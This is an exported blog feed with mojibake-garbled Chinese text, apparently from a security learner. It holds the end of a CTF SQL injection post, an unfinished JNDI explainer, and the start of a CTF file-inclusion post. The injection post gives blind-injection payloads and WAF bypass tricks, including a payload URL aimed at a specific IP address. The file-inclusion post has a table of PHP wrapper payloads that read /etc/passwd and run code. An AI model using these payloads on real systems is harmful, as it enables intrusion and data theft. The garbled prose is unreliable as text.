<h5 id="åˆ©ç”¨æ•°æ®åº“æ“ä½œå¼‚å¸¸è¿›è¡Œæ³¨å…¥"><a href="#åˆ©ç”¨æ•°æ®åº“æ“ä½œå¼‚å¸¸è¿›è¡Œæ³¨å…¥" class="headerlink" title="åˆ©ç”¨æ•°æ®åº“æ“ä½œå¼‚å¸¸è¿›è¡Œæ³¨å…¥"></a>åˆ©ç”¨æ•°æ®åº“æ“ä½œå¼‚å¸¸è¿›è¡Œæ³¨å…¥</h5><p>æœ‰æ—¶å€™æˆ‘ä»¬è§åˆ°çš„é¢˜ç›®sqlè¯­å¥æ‰§è¡Œä¸æˆåŠŸä¼šæŠ¥é”™ï¼Œä½†æ˜¯æ‰€æœ‰æŠ¥é”™éƒ½æ˜¯åŒæ ·çš„æ ·å¼ï¼Œæ²¡åŠæ³•é€šè¿‡æŠ¥é”™æ³¨å…¥æ¥è¿›è¡Œæ•°æ®æ³„éœ²ã€‚é‚£ä¹ˆæˆ‘ä»¬è¿˜å¯ä»¥ç”¨è¿™ç§æ•°æ®åº“å¼‚å¸¸æ¥è¿›è¡Œç›²æ³¨ï¼ˆç±»ä¼¼booleanç›²æ³¨ï¼‰ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ç©å„¿æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- åŸºäº and çš„ç‰¹æ€§ 0 and sql è¿™é‡Œçš„sqlä¸ä¼šæ‰§è¡Œï¼Œå› ä¸º0 and ä»»ä½• éƒ½æ˜¯ 0ï¼Œæ‰€ä»¥ä¸ä¼šæ¥ç€æ‰§è¡Œ</span></span><br><span class="line"><span class="string">&#x27;123&#x27;</span> <span class="keyword">and</span> ascii(mid(&#123;<span class="keyword">sql</span>&#125;,&#123;index&#125;,<span class="number">1</span>))<span class="operator">=</span>&#123;<span class="type">char</span>&#125; <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 0+~0 è¿”å›ä¸€ä¸²æ•´å½¢æ•°å­—  1+~0 æŠ¥é”™</span></span><br><span class="line"><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> (ascii(substr((<span class="keyword">select</span> t<span class="number">.2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> )t LIMIT <span class="number">1</span> </span><br><span class="line"><span class="keyword">OFFSET</span> <span class="number">1</span>),&#123;i&#125;,<span class="number">1</span>))<span class="operator">=</span>&#123;j&#125;)<span class="operator">+</span><span class="operator">~</span><span class="number">0</span>)#.format(i<span class="operator">=</span>i,j<span class="operator">=</span>j);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- è¿™ä¸ªæ˜¯ åŸºäºandçš„ä¾‹å­ pow() ä¹Ÿæ˜¯ä¼šæŠ¥é”™ æ‰€ä»¥ and + å¾ˆå¤šsqlå‡½æ•° éƒ½å¯ä»¥è¿™æ ·ç©å„¿</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> mid((<span class="keyword">select</span> username <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span> <span class="keyword">and</span> pow(<span class="number">222</span>,<span class="number">222222</span>);</span><br></pre></td></tr></table></figure>



<h5 id="å½“æ‰€æœ‰æ¯”è¾ƒç¬¦å·è¢«è¿‡æ»¤"><a href="#å½“æ‰€æœ‰æ¯”è¾ƒç¬¦å·è¢«è¿‡æ»¤" class="headerlink" title="å½“æ‰€æœ‰æ¯”è¾ƒç¬¦å·è¢«è¿‡æ»¤"></a>å½“æ‰€æœ‰æ¯”è¾ƒç¬¦å·è¢«è¿‡æ»¤</h5><p>è®°ä½è¿˜æœ‰ REGEXP</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">39.106</span><span class="number">.184</span><span class="number">.130</span>:<span class="number">8082</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>(mid(length(database()),<span class="number">1</span>,<span class="number">2</span>)<span class="operator">+</span>regexp<span class="operator">+</span><span class="operator">%</span><span class="number">27</span><span class="operator">^</span><span class="number">32</span><span class="operator">%</span><span class="number">27</span>)</span><br></pre></td></tr></table></figure>

<h5 id="æ¸—é€æµ‹è¯•ä¸­æ¯”è¾ƒå¥½ç”¨çš„çŸ¥è¯†ç‚¹"><a href="#æ¸—é€æµ‹è¯•ä¸­æ¯”è¾ƒå¥½ç”¨çš„çŸ¥è¯†ç‚¹" class="headerlink" title="æ¸—é€æµ‹è¯•ä¸­æ¯”è¾ƒå¥½ç”¨çš„çŸ¥è¯†ç‚¹"></a>æ¸—é€æµ‹è¯•ä¸­æ¯”è¾ƒå¥½ç”¨çš„çŸ¥è¯†ç‚¹</h5><ul>
<li>å‚æ•°æ±¡æŸ“</li>
<li>IIS ç‰¹æ€§unicodeç»•è¿‡  s%u0065lect ä½¿ç”¨hackbarç¼–ç </li>
<li>ä½¿ç”¨chunkæäº¤æ•°æ®</li>
<li>sqlserver å¯ä»¥ ï¼›å·ç»“æŸå‘½ä»¤</li>
<li>mysqlå†…è”æ³¨é‡Š</li>
<li>ç‰¹æ®Šå­—ç¬¦ %00 %0d %0a</li>
<li>ç©ºç™½å­—ç¬¦<br> mysql5ï¼šOA OB OC OD AO 20<br> MSSQL:01,02 åˆ° 09ï¼Œ0Aåˆ°0F,10åˆ°19ï¼Œ1Aåˆ°1F,20 </li>
<li>æ‹¬å·ç»•è¿‡ç©ºæ ¼ union(select)</li>
<li>æ’å…¥emoji &#x2F; å°è¯­ç§æ–‡å­—</li>
<li>ä½¿ç”¨sqlmap tamper</li>
<li>ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ç©ºæ ¼ 8e0union</li>
<li>æ— å›æ˜¾ï¼Œæ— ç‰¹å¾ï¼Œå–„ç”¨sleep()</li>
</ul>
<h4 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h4><p>å¾ˆå°‘èƒ½æ‰“CTFäº†ï¼Œä»¥å‰æ‰“CTFç«Ÿæ˜¯åšæ³¨å…¥çš„é¢˜ï¼Œæ‰€ä»¥æœ‰å¾ˆå¤šç»éªŒï¼Œä½†å†ä¸æ€»ç»“å¯èƒ½å°±å¿˜å®Œäº†ã€‚è¿™ç¯‡æ–‡ç« ä¹Ÿä¸ç®—æ˜¯æœ‰æŠ€æœ¯å«é‡ï¼Œåªæ˜¯ä¸ºCTFå°ç™½æ‰“ç‚¹åŸºç¡€ï¼Œå¼€é˜”è„‘æ´ï¼Œæ¯•ç«Ÿsqlæ³¨å…¥é¢˜åƒå˜ä¸‡åŒ–ï¼Œè¶Šæ¥è¶Šéš¾äº†ã€‚æœ€åå¸Œæœ›æœ‰äººèƒ½ä»è¿™å„¿å­¦åˆ°ä¸œè¥¿ã€‚</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>sqli</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»€ä¹ˆæ˜¯JNDI</title>
    <url>//posts/What-is-JDNI/</url>
    <content><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯JNDI"><a href="#ä»€ä¹ˆæ˜¯JNDI" class="headerlink" title="ä»€ä¹ˆæ˜¯JNDI"></a>ä»€ä¹ˆæ˜¯JNDI</h1><p>J2SEï¼Œæ˜¯java2çš„æ ‡å‡†ç‰ˆï¼Œä¸»è¦ç”¨äºå¼€å‘æ¡Œé¢çš„åº”ç”¨ç¨‹åºã€‚</p>
<p><strong>J2SEåŒ…å«äº†æ„æˆjavaè¯­è¨€æ ¸å¿ƒçš„ç±»ï¼šæ•°æ®åº“è¿æ¥ã€æ¥å£å®šä¹‰ã€è¾“å…¥è¾“å‡ºã€ç½‘ç»œç¼–è¾‘ç­‰ã€‚</strong></p>
<p>J2EE, æ˜¯java2çš„ä¼ä¸šç‰ˆï¼Œä¸»è¦ç”¨äºåˆ†å¸ƒå¼çš„ç½‘ç»œç¨‹åºçš„å¼€å‘ã€‚</p>
<p><strong>j2eeåŒ…å«j2seä¸­çš„ç±»ï¼Œè¿˜åŒ…å«ç”¨äºå¼€å‘ä¼ä¸šçº§åº”ç”¨çš„ç±»ï¼Œä¹ŸåŒ…å«ä¼ä¸šåº”ç”¨ä¸­å¾ˆå¤šçš„APIã€‚ä¾‹å¦‚ï¼šJDBCã€JNDIã€EJBç­‰</strong>ã€‚</p>
<p><strong>ä¸å°‘ä¸“å®¶è®¤ä¸ºï¼Œæ²¡æœ‰é€å½»ç†è§£JNDIçš„æ„ä¹‰å’Œä½œç”¨ï¼Œå°±æ²¡æœ‰çœŸæ­£æŒæ¡J2EEç‰¹åˆ«æ˜¯EJBçš„çŸ¥è¯†</strong></p>
<h2 id="JNDIæ¦‚å¿µ"><a href="#JNDIæ¦‚å¿µ" class="headerlink" title="JNDIæ¦‚å¿µ"></a>JNDIæ¦‚å¿µ</h2><p>JNDIå…¨ç§°Java Naming and Directory Interface ç¿»è¯‘è¿‡æ¥å°±æ˜¯Javaå‘½åå’Œç›®å½•æ¥å£ã€‚è¿™ä¸ªæ¦‚å¿µæå‡ºæ¥å°±æ˜¯ä¸ºäº†æ–¹ä¾¿äººä»¬æ¥è®°å½•ä¸€äº›ä¸å®¹æ˜“è®°å½•éƒ½å†…å®¹ã€‚æœ‰ç‚¹ç±»ä¼¼äºåŸŸåå’Œipçš„æ˜ å°„ã€‚æ‰€ä»¥å¦‚æœè¦æ·±å…¥çš„å­¦å¯èƒ½ä¼šè¢«ç»•è¿›å»ï¼Œç°åœ¨ä½ å¯ä»¥ç®€å•çš„ç†è§£ä¸ºä»–æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œç»™ä¸åŒçš„å¯¹è±¡å’Œå±æ€§ï¼ˆvalueï¼‰å–åï¼ˆkeyï¼‰ã€‚åˆ°æ—¶å€™å¥½æ‰¾å‡ºæ¥ç”¨ã€‚</p>
<h2 id="JNDIä½œç”¨"><a href="#JNDIä½œç”¨" class="headerlink" title="JNDIä½œç”¨"></a>JNDIä½œç”¨</h2><p>ç½‘ä¸Šæ¯”è¾ƒç»å…¸çš„ä¾‹å­å°±æ˜¯JDBCè¿æ¥æ•°æ®åº“ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Scr</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//JDBCé©±åŠ¨å</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">JDBC_DRIVER</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="comment">//æ•°æ®åº“URLï¼šè¿™é‡Œçš„ttæ˜¯æ•°æ®åº“åç§°</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">JDBC_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/tt?useSSL=false&amp;serverTimezone=UTC&quot;</span>;</span><br><span class="line"><span class="comment">//        æ•°æ®åº“çš„ç”¨æˆ·åä¸å¯†ç </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">USER</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">PASS</span> <span class="operator">=</span> <span class="string">&quot;admin123&quot;</span>;</span><br><span class="line">        <span class="comment">//é€šè¿‡DriverManagerç±»è·å¾—è¯¥è¿æ¥å¯¹è±¡æ‰èƒ½è®¿é—®æ•°æ®åº“</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//        é€šè¿‡Connectionè·å¾—è¯¥ç»“æœå¯¹è±¡ç”¨äºæ‰§è¡Œé™æ€çš„SQLè¯­å¥</span></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//            æ³¨å†ŒJDBCé©±åŠ¨</span></span><br><span class="line">            Class.forName(JDBC_DRIVER);</span><br><span class="line">            </span><br><span class="line"><span class="comment">//            æ•°æ®åº“çš„è¿æ¥ï¼šé€šè¿‡DriverManagerç±»çš„getConnectionæ–¹æ³•ï¼Œä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼šæ•°æ®åº“URLã€ç”¨æˆ·åã€ç”¨æˆ·å¯†ç ï¼Œå®ä¾‹åŒ–connectionå¯¹è±¡</span></span><br><span class="line">            connection = DriverManager.getConnection(JDBC_URL,USER,PASS);</span><br><span class="line"><span class="comment">//            å®ä¾‹åŒ–statementå¯¹è±¡</span></span><br><span class="line">            statement = (Statement) connection.createStatement();</span><br><span class="line"><span class="comment">//            å®šä¹‰æ•°æ®åº“æŸ¥è¯¢è¯­å¥ï¼šæŸ¥è¯¢aaè¡¨ä¸­çš„nameã€sexä¸¤åˆ—æ•°æ®</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT name,sex FROM aa&quot;</span>;</span><br><span class="line"><span class="comment">//            æ‰§è¡ŒæŸ¥è¯¢è¯­å¥</span></span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line"><span class="comment">//            å±•å¼€æŸ¥è¯¢åˆ°çš„æ•°æ®</span></span><br><span class="line">            <span class="keyword">while</span>(rSet.next()) &#123;</span><br><span class="line"><span class="comment">//                è¿™é‡ŒgetString()æ–¹æ³•ä¸­çš„å‚æ•°å¯¹åº”çš„æ˜¯æ•°æ®åº“è¡¨ä¸­çš„åˆ—å</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">get_name</span> <span class="operator">=</span> rSet.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">get_sex</span> <span class="operator">=</span> rSet.getString(<span class="string">&quot;sex&quot;</span>);</span><br><span class="line"><span class="comment">//                è¾“å‡ºæ•°æ®</span></span><br><span class="line">                System.out.println(<span class="string">&quot;åå­—:&quot;</span>+get_name);</span><br><span class="line">                System.out.print(<span class="string">&quot;æ€§åˆ«:&quot;</span>+get_sex);                   </span><br><span class="line">            &#125;  </span><br><span class="line"><span class="comment">//            ä¾æ¬¡å…³é—­å¯¹è±¡</span></span><br><span class="line">            rSet.close();</span><br><span class="line">            statement.close();</span><br><span class="line">            connection.close();            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯æˆ‘ä»¬åˆå­¦javaæ—¶çš„ä»£ç ï¼Œå› ä¸ºé‚£æ—¶å€™æˆ‘ä»¬éƒ½æ˜¯ä¸€ä¸ªäººå¼€å‘æ•´ä¸ªç³»ç»Ÿï¼Œå¦‚æœæœ‰ä¸€å¤©ä¸€å®¶å…¬å¸æœ‰æˆç™¾ä¸Šåƒçš„äººå¼€å‘åŒä¸€å¥—ç³»ç»Ÿå‘¢ï¼Ÿæ˜¯ä¸æ˜¯ä¸åº”è¯¥æ‰€æœ‰çš„ç¨‹åºå‘˜éƒ½çŸ¥é“è¿™ä¸ªè´¦å·å¯†ç ã€urlæ ¼å¼ã€åç«¯çš„å®ç°é€»è¾‘ã€æ•°æ®åº“ç±»å‹ç­‰ç­‰ï¼Ÿè¿™å°±æ˜¯Javaç¼–ç¨‹ä¸­é‡è¦çš„æ€æƒ³ï¼š<strong>è§£è—•</strong>ã€‚</p>
<p>è§£è—•å½“ç„¶å‘¢ä¸åªJNDIè¿™ä¸€ç§æ–¹å¼ã€‚å¾ˆå¤šæ—¶å€™å°è£…çš„è¶Šæ¥è¶Šç»†å°ä¹Ÿç®—æ˜¯è§£è€¦ã€‚ä½†æ˜¯JNDIæä¾›äº†è¿™ç§æ›´æ–¹ä¾¿çš„è§£è—•æ¦‚å¿µã€‚</p>
<p>æ¯”å¦‚ä¸Šé¢è¿™ä¸ªé“¾æ¥æ•°æ®åº“çš„ä»£ç æˆ‘å¯ä»¥ç”¨JNDIè¿™æ ·åšï¼š</p>
<p>å®šä¹‰ä¸€ä¸ªxmlæ¨¡ç‰ˆï¼Œmysql.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">datasources</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">local-tx-datasource</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">jndi-name</span>&gt;</span>mysqlconfigsouce<span class="tag">&lt;/<span class="name">jndi-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">connection-url</span>&gt;</span>jdbc:mysql://localhost:3306/<span class="tag">&lt;/<span class="name">connection-url</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">driver-class</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">driver-class</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">user-name</span>&gt;</span>root<span class="tag">&lt;/<span class="name">user-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd<span class="tag">&lt;/<span class="name">password</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">exception-sorter-class-name</span>&gt;</span>  </span><br><span class="line">org.jboss.resource.adapter.jdbc.vendor.MySQLExceptionSorter  </span><br><span class="line"><span class="tag">&lt;/<span class="name">exception-sorter-class-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">metadata</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">type-mapping</span>&gt;</span>mySQL<span class="tag">&lt;/<span class="name">type-mapping</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">metadata</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">local-tx-datasource</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">datasources</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>ç„¶åæˆ‘ä»¬åœ¨ç¨‹åºä¸­å¼•ç”¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Connection conn=<span class="literal">null</span>;  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">  Context ctx=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();  <span class="comment">//è·å–ä¸Šä¸‹æ–‡</span></span><br><span class="line">  Object datasourceRef=ctx.lookup(<span class="string">&quot;java:mysqlconfigsouce&quot;</span>); <span class="comment">//å¼•ç”¨æ•°æ®æº</span></span><br><span class="line">  DataSource ds=(Datasource)datasourceRef;  </span><br><span class="line">  conn=ds.getConnection();  </span><br><span class="line">  ......  </span><br><span class="line">  c.close();  </span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;  </span><br><span class="line">  e.printStackTrace();  </span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;  </span><br><span class="line">  <span class="keyword">if</span>(conn!=<span class="literal">null</span>) &#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">      conn.close();  </span><br><span class="line">    &#125; <span class="keyword">catch</span>(SQLException e) &#123; &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å½“ç„¶JNDIåªæ˜¯ä¸€ä¸ªæ¦‚å¿µï¼Œå…·ä½“å®ç°è¿˜æœ‰rmiå’Œldapç­‰åè®®å‚ä¸å…¶ä¸­ã€‚ä¸Šé¢åªæ˜¯ä¸¾ä¸ªä¾‹å­ã€‚</p>
<p>è¿™é‡Œè¡¥å……ä¸€ç‚¹ï¼šæ­£å¦‚æˆ‘ä»¬ç¬¬ä¸€èŠ‚æ‰€è¯´çš„ï¼ŒJNDIæ˜¯ä¸€ä¸ªç±»ä¼¼åŸŸåå’Œipçš„å¯¹åº”æœºåˆ¶ï¼Œé‚£javax.naming çš„åŒ…ä¸­å°±æä¾›äº†Contextæ¥å£ï¼Œæœ€é‡è¦çš„</p>
<p>å°±æ˜¯ä¸¤ä¸ªæ–¹æ³•ï¼š</p>
<p>1ã€ void bind( String name , Object object )<br>    ç»‘å®š<br>2ã€Object lookup( String name )<br>    è·å–</p>
<p>JNDIåœ¨JAVAåº”ç”¨ç¨‹åºä¸­çš„ä½ç½®ï¼š</p>
<p>![image-20230130163311234](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230130163311234.png)</p>
<p>å¯ä»¥çœ‹åˆ°JNDIåœ¨åº”ç”¨ç¨‹åºå’Œåº•å±‚æœåŠ¡LADPã€DNSã€RMIç­‰ç­‰ä¹‹é—´ï¼Œå¯ä»¥ç†è§£ä¸ºJNDIå°è£…äº†ä¸€å¥—ç®¡ç†å‘½åå’Œç›®å½•çš„æ¥å£ï¼Œé€šè¿‡JNDIæˆ‘ä»¬å¯ä»¥ä½¿ç”¨rmiã€LDAPç­‰å„ç§åè®®çš„å‘½åå’Œç›®å½•æœåŠ¡ã€‚å½“ç„¶å¦‚æœJNDIçš„æ£€ç´¢å‚æ•°è¢«æ§åˆ¶ï¼Œå°±ä¼šå¼•å‘é‡å¤§å®‰å…¨é—®é¢˜ï¼Œè¿™å°±æ˜¯åé¢è¦å†™çš„JNDIæ³¨å…¥çš„é—®é¢˜ã€‚</p>
<p>â€”â€”â€”â€“å¤ªå¿™äº†å…ˆä¸å†™äº†â€”â€”â€”</p>
<p>è¦åˆ†æçš„æ¼æ´ï¼šfastjsonã€log4jã€shiroã€weblogicé‚£äº›</p>
]]></content>
      <categories>
        <category>javaå®‰å…¨</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFä¸­çš„æ–‡ä»¶åŒ…å«</title>
    <url>//posts/CTF%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>CTFæ¯”èµ›ä¸­æ–‡ä»¶åŒ…å«æ€»æ˜¯ä½œä¸ºç¬¬ä¸€æ­¥æˆ–è€…æœ€åä¸€æ­¥æ¥è¿›è¡Œä¿¡æ¯æ³„éœ²æˆ–è€…flagè¯»å–ï¼Œå¤§å¤šæ•°çš„æ–‡ä»¶åŒ…å«ä¸æ–‡ä»¶è¯»å–æœ‰å…³ï¼Œå‰©ä¸‹çš„å¯èƒ½å°±æ˜¯é€šè¿‡æ–‡ä»¶åŒ…å«æ¥getshellã€‚</p>
<p>è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹æˆ‘æ‰“CTFæ¯”èµ›ä¸­çš„ä¸€äº›æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨ç»éªŒï¼ˆç”±äºæ¯”èµ›å¤§éƒ¨åˆ†æ˜¯PHPçš„æ–‡ä»¶åŒ…å«ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ä»¥PHPçš„æ–‡ä»¶åŒ…å«ä¸ºæ¡ˆä¾‹æ¥å†™çš„ï¼Œå…¶ä»–è¯­è¨€çš„æ–‡ä»¶åŒ…å«ç±»ä¼¼ï¼‰ã€‚</p>
<p>CTFä¸­çš„æ–‡ä»¶åŒ…å«ï¼Œçœ‹è¿™ä¸€ç¯‡å°±å¤Ÿäº†ï¼</p>
<span id="more"></span>

<h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><p>1ã€æ–‡ä»¶åŒ…å«åˆ†ä¸º ï¼šæœ¬åœ°åŒ…å«å’Œè¿œç¨‹åŒ…å« è¿œç¨‹åŒ…å«éœ€è¦php.iniä¸­çš„allow_url_include &#x3D; On<br>2ã€inclue() include_once()å’Œrequireï¼ˆï¼‰require_onceåŒºåˆ« ï¼š å‰è€…é‡åˆ°é”™è¯¯ç»™å‡ºè­¦å‘Šç»§ç»­æ‰§è¡Œï¼Œåè€…ç›´æ¥ç»™å‡ºè­¦å‘Šï¼Œç»ˆç«¯æ‰§è¡Œï¼<br>3ã€ä¸€å¼ è¡¨äº†è§£phpçš„ä¼ªåè®®ï¼š</p>
<table>
<thead>
<tr>
<th>åè®®</th>
<th>æµ‹è¯•phpç‰ˆæœ¬</th>
<th>allow_url_fopen</th>
<th>allow_url_include</th>
<th>ç”¨æ³•</th>
</tr>
</thead>
<tbody><tr>
<td>file:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>off&#x2F;on</td>
<td>off&#x2F;on</td>
<td>?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;filter</td>
<td>&gt;&#x3D;5.2</td>
<td>off&#x2F;on</td>
<td>off&#x2F;on</td>
<td>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;input</td>
<td>&gt;&#x3D;5.2</td>
<td>off&#x2F;on</td>
<td>on</td>
<td>?file&#x3D;php:&#x2F;&#x2F;input POST DATA <?php phpinfo(); ?></td>
</tr>
<tr>
<td>zip:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>off&#x2F;on</td>
<td>off&#x2F;on</td>
<td>?file&#x3D;zip:&#x2F;&#x2F;&#x2F;tmp&#x2F;1.zip%231.txt</td>
</tr>
<tr>
<td>compress.bzip2:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>off&#x2F;on</td>
<td>off&#x2F;on</td>
<td>?file&#x3D;compress.bzip2:&#x2F;&#x2F;.&#x2F;file.bz2</td>
</tr>
<tr>
<td>compress.zlib:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>off&#x2F;on</td>
<td>off&#x2F;on</td>
<td>?file&#x3D;compress.zlib:&#x2F;&#x2F;.&#x2F;file.gz</td>
</tr>
<tr>
<td>data:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>on</td>
<td>on</td>
<td>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo(); ?> or ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D; or ?file&#x3D;data:text&#x2F;plain,<?php phpinfo();?> or ?file&#x3D;data.text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;</td>
</tr>
<tr>
<td>phar:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>off&#x2F;on</td>
<td>off&#x2F;on</td>
<td>?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;php.jpg</td>
</tr>
</tbody></table>
<p>4ã€é™¤äº†åŸºç¡€çŸ¥è¯†ï¼Œæˆ‘ä»¬è¿˜éœ€è¦äº†è§£ä¸€äº›ç‰¹æ€§ï¼š</p>
<ul>
<li><p>%00æˆªæ–­ åªé€‚ç”¨äºä½ç‰ˆæœ¬php  php &lt;&#x3D; 5.3.0 ä¸”magic_quotes_gpc ä¸ºoff</p>
</li>
<li><p>ç‚¹å· ç³»ç»Ÿç‰¹æ€§æˆªæ–­ åªé€‚ç”¨äºä½ç‰ˆæœ¬php  php &lt;&#x3D; 5.3.0<br>windows 259ä¸ªbytes <strong>.</strong> å¯é€ æˆæˆªæ–­</p>
<p>linux 4096ä¸ªbytes <strong>.</strong>  å¯é€ æˆæˆªæ–­</p>
</li>
